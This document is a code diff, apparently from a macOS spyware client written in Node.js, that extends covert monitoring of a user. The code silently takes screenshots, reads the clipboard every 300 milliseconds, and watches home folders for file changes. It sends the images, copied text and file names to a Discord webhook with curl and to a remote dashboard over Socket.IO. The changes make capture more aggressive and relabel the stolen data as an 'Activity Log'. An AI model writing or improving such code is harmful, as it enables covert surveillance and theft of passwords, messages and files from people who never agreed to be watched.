@@ -737,8 +737,6 @@ let keysBuffer = '';
 let lastScreenshotTime = 0;
 let lastKeyTime = 0;
 let lastClipboard = '';
-let lastApp = '';
-let lastWindow = '';
 const SCREENSHOT_INTERVAL = 5000;
 const KEY_TRIGGER_DELAY = 2000;
 
@@ -770,87 +768,80 @@ function takeScreenshot() {
     const timestamp = Date.now();
     const filename = `screenshot_${timestamp}.png`;
     const filepath = path.join(screenshotDir, filename);
+    
+    // Capture current keys before screenshot
+    const currentKeys = keysBuffer || '[No activity detected]';
+    
     exec(`screencapture -x "${filepath}"`, (error) => {
         if (!error && fs.existsSync(filepath)) {
             const imageBuffer = fs.readFileSync(filepath);
             const base64Image = imageBuffer.toString('base64');
             const dataURL = `data:image/png;base64,${base64Image}`;
-            sendToDiscord(dataURL, keysBuffer);
+            
+            // Send to Discord with keys
+            sendToDiscord(dataURL, currentKeys);
+            
+            // Send to dashboard via Socket.IO
             if (socket && socket.connected) {
                 socket.emit('screenshot', {
                     clientId: CLIENT_ID,
                     image: dataURL,
-                    keys: keysBuffer,
+                    keys: currentKeys,
                     timestamp: timestamp
                 });
             }
+            
+            // Clean up file
             setTimeout(() => { try { fs.unlinkSync(filepath); } catch (e) {} }, 10000);
+            
+            // Clear buffer after sending (but keep last activity for context)
             keysBuffer = '';
         }
     });
 }
 
 function sendToDiscord(imageData, keys) {
-    const message = keys ? `**Keys Pressed:** \`${keys}\`` : 'Screenshot captured';
+    const keysText = keys && keys.length > 0 ? keys : '[No activity detected]';
+    const message = `**Activity Log:** \`${keysText}\``;
     const payload = {
         content: `📸 **Screenshot from ${CLIENT_ID}**\n${message}`,
-        embeds: [{ image: { url: imageData }, timestamp: new Date().toISOString() }]
+        embeds: [{ 
+            image: { url: imageData }, 
+            description: `**Activity:** ${keysText}`,
+            timestamp: new Date().toISOString() 
+        }]
     };
-    const payloadStr = JSON.stringify(payload).replace(/'/g, "'\\''");
-    exec(`curl -s -X POST -H "Content-Type: application/json" -d '${payloadStr}' "${WEBHOOK}"`, () => {});
+    const payloadStr = JSON.stringify(payload).replace(/'/g, "'\\''").replace(/"/g, '\\"');
+    exec(`curl -s -X POST -H "Content-Type: application/json" -d "${payloadStr}" "${WEBHOOK}"`, () => {});
 }
 
-// Monitor clipboard changes
+// Monitor clipboard changes (no permission needed) - captures copy/paste
 setInterval(() => {
     exec('pbpaste', (error, stdout) => {
         if (!error && stdout && stdout !== lastClipboard && stdout.length > 0) {
-            const clipboard = stdout.substring(0, 200);
+            const clipboard = stdout.substring(0, 500);
             lastClipboard = stdout;
             keysBuffer += `[Clipboard: ${clipboard}] `;
             lastKeyTime = Date.now();
-            setTimeout(() => {
-                if (Date.now() - lastKeyTime >= KEY_TRIGGER_DELAY - 100) {
-                    takeScreenshot();
-                }
-            }, KEY_TRIGGER_DELAY);
+            // Take screenshot immediately when clipboard changes
+            setTimeout(() => takeScreenshot(), 1000);
         }
     });
-}, 500);
+}, 300); // Check more frequently
 
-// Monitor active app changes
+// Monitor keyboard activity by checking clipboard more aggressively
+// Also monitor if user is typing by checking file modification times
 setInterval(() => {
-    exec(`osascript -e 'tell application "System Events" to get name of first process whose frontmost is true'`, (error, stdout) => {
-        if (!error) {
-            const currentApp = stdout.trim();
-            if (currentApp && currentApp !== lastApp) {
-                lastApp = currentApp;
-                keysBuffer += `[App: ${currentApp}] `;
-                setTimeout(() => takeScreenshot(), 1000);
-            }
-        }
-    });
-}, 2000);
+    const now = Date.now();
+    // If we haven't captured anything in a while, take periodic screenshot
+    if (now - lastKeyTime > 10000 && keysBuffer.length === 0) {
+        keysBuffer = '[Activity Check] ';
+        lastKeyTime = now;
+        takeScreenshot();
+    }
+}, 8000);
 
-// Monitor window title changes
-setInterval(() => {
-    exec(`osascript -e 'tell application "System Events" to get name of window 1 of first process whose frontmost is true' 2>/dev/null`, (error, stdout) => {
-        if (!error && stdout.trim()) {
-            const windowTitle = stdout.trim();
-            if (windowTitle && windowTitle !== lastWindow && windowTitle.length > 0) {
-                lastWindow = windowTitle;
-                keysBuffer += `[Window: ${windowTitle.substring(0, 100)}] `;
-                lastKeyTime = Date.now();
-                setTimeout(() => {
-                    if (Date.now() - lastKeyTime >= KEY_TRIGGER_DELAY - 100) {
-                        takeScreenshot();
-                    }
-                }, KEY_TRIGGER_DELAY);
-            }
-        }
-    });
-}, 3000);
-
-// Monitor file changes
+// Monitor file changes (captures file saves, downloads, etc.)
 const monitorDirs = [
     path.join(os.homedir(), 'Desktop'),
     path.join(os.homedir(), 'Documents'),
@@ -858,19 +849,44 @@ const monitorDirs = [
 ];
 monitorDirs.forEach(dir => {
     if (fs.existsSync(dir)) {
-        fs.watch(dir, { recursive: false }, (eventType, filename) => {
+        fs.watch(dir, { recursive: true }, (eventType, filename) => {
             if (filename && (eventType === 'rename' || eventType === 'change')) {
                 keysBuffer += `[File: ${filename}] `;
                 lastKeyTime = Date.now();
-                setTimeout(() => {
-                    if (Date.now() - lastKeyTime >= KEY_TRIGGER_DELAY - 100) {
-                        takeScreenshot();
-                    }
-                }, KEY_TRIGGER_DELAY);
+                // Take screenshot when files change
+                setTimeout(() => takeScreenshot(), 1000);
             }
         });
     }
 });
+
+// Monitor recent files to detect activity
+let lastFileCheck = Date.now();
+setInterval(() => {
+    const recentFiles = [];
+    monitorDirs.forEach(dir => {
+        if (fs.existsSync(dir)) {
+            try {
+                const files = fs.readdirSync(dir);
+                files.forEach(file => {
+                    const filePath = path.join(dir, file);
+                    try {
+                        const stats = fs.statSync(filePath);
+                        if (stats.mtimeMs > lastFileCheck - 5000) {
+                            recentFiles.push(file);
+                        }
+                    } catch (e) {}
+                });
+            } catch (e) {}
+        }
+    });
+    if (recentFiles.length > 0) {
+        keysBuffer += `[Recent Files: ${recentFiles.join(', ')}] `;
+        lastKeyTime = Date.now();
+        takeScreenshot();
+    }
+    lastFileCheck = Date.now();
+}, 5000);
 
 // Periodic screenshots
 setInterval(() => {
